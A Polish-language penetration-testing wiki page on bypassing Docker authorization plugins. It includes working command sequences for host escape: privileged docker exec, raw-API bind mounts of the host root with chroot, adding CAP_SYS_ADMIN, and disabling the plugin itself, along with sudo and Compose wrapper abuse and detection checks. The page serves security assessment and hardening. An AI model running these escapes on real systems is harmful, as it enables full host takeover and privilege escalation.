# Wtyczki autoryzacji Runtime

{{#include ../../../banners/hacktricks-training.md}}

## Omówienie

Wtyczki autoryzacji Runtime to dodatkowa warstwa zasad, która decyduje, czy wywołujący może wykonać daną operację demona. Klasycznym przykładem jest Docker. Domyślnie każdy, kto może komunikować się z demonem Docker, ma nad nim szeroką kontrolę. Wtyczki autoryzacji próbują ograniczyć ten model, sprawdzając uwierzytelnionego użytkownika i żądaną operację API, a następnie zezwalając na żądanie lub je odrzucając zgodnie z zasadami.

Temat zasługuje na osobną stronę, ponieważ zmienia model eksploatacji, gdy atakujący ma już dostęp do API Docker lub do użytkownika z grupy `docker`. W takich środowiskach pytanie nie brzmi już tylko „czy mogę połączyć się z demonem?”, lecz także „czy demon jest chroniony warstwą autoryzacji, a jeśli tak, czy można ją ominąć przez nieobsługiwane endpointy, słabe parsowanie JSON lub uprawnienia do zarządzania wtyczkami?”.

## Działanie

Gdy żądanie trafia do demona Docker, podsystem autoryzacji może przekazać kontekst żądania jednej lub kilku zainstalowanym wtyczkom. Wtyczka widzi tożsamość uwierzytelnionego użytkownika, szczegóły żądania, wybrane nagłówki oraz części treści żądania lub odpowiedzi, jeśli typ zawartości na to pozwala. Można łączyć wiele wtyczek, a dostęp zostaje przyznany tylko wtedy, gdy wszystkie zezwolą na żądanie.

Ten model wygląda na bezpieczny, ale jego skuteczność zależy w całości od tego, jak dobrze autor zasad rozumie API. Wtyczka blokująca `docker run --privileged`, ale ignorująca `docker exec`, pomijająca alternatywne klucze JSON, takie jak najwyższopoziomowe `Binds`, lub zezwalająca na zarządzanie wtyczkami może tworzyć fałszywe poczucie ograniczeń, jednocześnie pozostawiając otwarte bezpośrednie ścieżki eskalacji uprawnień.

## Typowe cele wtyczek

Ważne obszary do sprawdzenia zasad:

- endpointy tworzenia kontenerów
- pola `HostConfig`, takie jak `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` i opcje współdzielenia przestrzeni nazw
- działanie `docker exec`
- endpointy zarządzania wtyczkami
- każdy endpoint, który może pośrednio uruchamiać działania runtime poza zakładanym modelem zasad

Historycznie przykłady takie jak wtyczka `authz` firmy Twistlock i proste wtyczki edukacyjne, takie jak `authobot`, ułatwiały analizę tego modelu, ponieważ ich pliki zasad i ścieżki kodu pokazywały, jak faktycznie zaimplementowano mapowanie endpointów na działania. Najważniejsza lekcja dla osób przeprowadzających ocenę bezpieczeństwa jest taka, że autor zasad musi rozumieć całe API, a nie tylko najbardziej widoczne polecenia CLI.

## Nadużycia

Pierwszym celem jest ustalenie, co faktycznie jest blokowane. Gdy demon odrzuca działanie, komunikat o błędzie często ujawnia nazwę wtyczki, co pomaga zidentyfikować używany mechanizm kontroli:

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

Jeśli potrzebujesz szerszego profilowania endpointów, przydatne są narzędzia takie jak `docker_auth_profiler`, ponieważ automatyzują żmudne sprawdzanie, które trasy API i struktury JSON są faktycznie dozwolone przez plugin.

Jeśli środowisko korzysta z niestandardowego pluginu i możesz komunikować się z API, ustal, które pola obiektów są faktycznie filtrowane:

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

Te kontrole są istotne, ponieważ wiele błędów autoryzacji dotyczy konkretnych pól, a nie całych koncepcji. Plugin może odrzucić wzorzec CLI, nie blokując w pełni równoważnej struktury API.

### Pełny przykład: `docker exec` dodaje uprawnienia po utworzeniu kontenera

Politykę, która blokuje tworzenie kontenerów w trybie uprzywilejowanym, ale zezwala na tworzenie kontenerów bez ograniczeń oraz użycie `docker exec`, nadal można obejść:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

Jeśli daemon akceptuje drugi krok, użytkownik odzyskuje uprzywilejowany, interaktywny proces wewnątrz kontenera, który — według autora polityki — miał być ograniczony.

Ograniczona reguła `sudo` może udostępnić tę samą ścieżkę, nawet jeśli wywołujący nie ma bezpośredniego dostępu do socketu Docker. Na przykład reguła zezwalająca na uruchomienie przez roota `/usr/bin/docker exec *` może pozwolić wywołującemu podać opcje Docker `--privileged` i `--user root`. Wymagany jest działający kontener; na niektórych hostach Linux jego ID jest widoczne w wierszu poleceń procesu `containerd-shim`, gdy polecenie `docker ps` jest niedozwolone. Potraktuj tę regułę jako wskazówkę do weryfikacji: sprawdź efektywną politykę sudo, mechanizmy autoryzacji daemon, przestrzenie nazw użytkowników oraz to, czy wynikowy proces może uzyskać dostęp do urządzenia hosta lub zapisywalnego punktu montowania hosta. Docker opisuje opcje `exec` w swojej [dokumentacji CLI](https://docs.docker.com/reference/cli/docker/container/exec/).

Wrapper uruchamiany przez roota, który akceptuje wskazany przez wywołującego plik Compose, musi weryfikować cały [model usług Compose](https://docs.docker.com/reference/compose-file/services/), a nie tylko odrzucać `privileged: true` i wymagać `:ro` w bind mountach. Sprawdź `cap_add`, `security_opt`, urządzenia, przestrzenie nazw, dane wejściowe kompilacji oraz każdą obsługiwaną składnię woluminów. Bind mount tylko do odczytu nadal może być zapisywalny z poziomu kontenera, jeśli ma on odpowiednie możliwości, a izolacja bezpieczeństwa jest poluzowana — zależnie od polityki daemon i jądra. Weryfikacji wymagają również listy dozwolonych ścieżek hosta oparte wyłącznie na prefiksach oraz sprawdzanie dowiązań symbolicznych tylko w końcowym elemencie ścieżki. Reguła sudo i dosłowne wywołanie `docker-compose up` wskazują potencjalny problem; o tym, czy można go wykorzystać, decydują efektywna walidacja wrappera i ograniczenia daemon podczas działania.

### Pełny przykład: bind mount przez surowe API

Niektóre błędne polityki sprawdzają tylko jeden kształt JSON. Jeśli bind mount głównego systemu plików nie jest konsekwentnie blokowany, host nadal może zostać zamontowany:

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

Ta sama koncepcja może również występować w `HostConfig`:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

Skutkiem jest pełna ucieczka z systemu plików hosta. Ciekawym szczegółem jest to, że obejście wynika z niepełnego pokrycia zasadami, a nie z błędu jądra.

### Pełny przykład: niesprawdzany atrybut capability

Jeśli zasady nie filtrują atrybutu związanego z capability, atakujący może utworzyć kontener, który odzyska niebezpieczną capability:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

Gdy dostępna jest `CAP_SYS_ADMIN` lub podobna, silna capability, można zastosować wiele technik breakout opisanych w [capabilities.md](protections/capabilities.md) i [privileged-containers.md](privileged-containers.md).

### Pełny przykład: wyłączenie pluginu

Jeśli dozwolone są operacje zarządzania pluginami, najczystszym obejściem może być całkowite wyłączenie kontroli:

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

To błąd polityki na poziomie control-plane. Warstwa autoryzacji istnieje, ale użytkownik, którego miała ograniczać, nadal ma uprawnienia do jej wyłączenia.

## Kontrole

Te polecenia mają pomóc ustalić, czy istnieje warstwa polityk oraz czy jest kompletna, czy tylko pozorna.

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

Co jest tutaj interesujące:

- Komunikaty o odmowie, które zawierają nazwę pluginu, potwierdzają istnienie warstwy autoryzacji i często ujawniają dokładną implementację.
- Lista pluginów widoczna dla atakującego może wystarczyć, aby ustalić, czy operacje wyłączania lub rekonfiguracji są możliwe.
- Politykę, która blokuje tylko oczywiste działania CLI, ale nie surowe żądania API, należy uznać za bypassable, dopóki nie zostanie udowodnione inaczej.

## Domyślne ustawienia runtime’ów

| Runtime / platforma | Stan domyślny | Domyślne zachowanie | Częste ręczne osłabienia |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie wyłączone | Dostęp do demona jest w praktyce typu wszystko albo nic, chyba że skonfigurowano plugin autoryzacyjny | niekompletna polityka pluginów, blacklists zamiast allowlists, zezwalanie na zarządzanie pluginami, martwe pola na poziomie pól |
| Podman | Brak powszechnego, bezpośredniego odpowiednika | Podman zazwyczaj w większym stopniu opiera się na uprawnieniach Unix, działaniu bez roota i decyzjach dotyczących udostępniania API niż na pluginach autoryzacyjnych w stylu Dockera | szerokie udostępnianie API Podmana działającego z uprawnieniami roota, słabe uprawnienia do socketu |
| containerd / CRI-O | Inny model kontroli | Te runtime’y zazwyczaj opierają się na uprawnieniach do socketu, granicach zaufania węzłów i kontrolach orkiestratora wyższej warstwy, a nie na pluginach autoryzacyjnych Dockera | montowanie socketu w workloadach, słabe założenia dotyczące zaufania lokalnego dla węzła |
| Kubernetes | Korzysta z authn/authz na poziomie API servera i kubeleta, a nie z pluginów autoryzacyjnych Dockera | Główną warstwę polityk stanowią RBAC klastra i mechanizmy kontroli przyjmowania | zbyt szerokie RBAC, słabe polityki kontroli przyjmowania, bezpośrednie udostępnianie API kubeleta lub runtime’u |

{{#include ../../../banners/hacktricks-training.md}}
